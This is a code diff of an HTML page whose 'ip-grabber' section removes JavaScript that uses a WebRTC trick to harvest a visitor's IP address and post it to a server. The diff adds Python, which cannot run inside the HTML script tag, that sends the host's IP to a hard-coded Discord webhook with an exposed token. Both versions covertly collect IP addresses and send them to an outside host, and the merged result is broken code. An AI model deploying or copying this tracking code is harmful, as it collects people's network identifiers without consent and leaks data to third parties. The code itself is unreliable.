@@ -12,22 +12,28 @@
   <body>
     <div id="ip-grabber">
         <script>
-            // Get the IP address of the client
-            var ip = "";
-            window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;   //compatibility for Firefox and chrome
-            var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};
-            pc.createDataChannel("");    //create a bogus data channel
-            pc.createOffer(pc.setLocalDescription.bind(pc), noop);    // create offer and set local description
-            pc.onicecandidate = function(ice){  //listen for candidate events
-                if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
-                ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
-            };
+import requests
+import socket
 
-            // Send the IP address to the server
-            var req = new XMLHttpRequest();
-            req.open("POST", "", true);
-            req.send("IP=" + ip);
-        </script>
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1084024489802747934/dyX_Nxud0eoiH8HWgaFZCBZsmyBZM4D6tTcGuL9_NPf5vyQ7T0K4PTJMJ8zQPLZvDhXd'
+
+def post_to_webhook(message):
+    data = {
+        'content': message
+    }
+    requests.post(WEBHOOK_URL, json=data)
+
+def get_ip():
+    return socket.gethostbyname(socket.gethostname())
+
+if __name__ == '__main__':
+    try:
+        ip = get_ip()
+        post_to_webhook('The IP address is: {}'.format(ip))
+        print('IP posted to Discord webhook')
+    except Exception as e:
+        print('An error occurred: {}'.format(e))
+</script>
     </div>
   </body>
 </html>
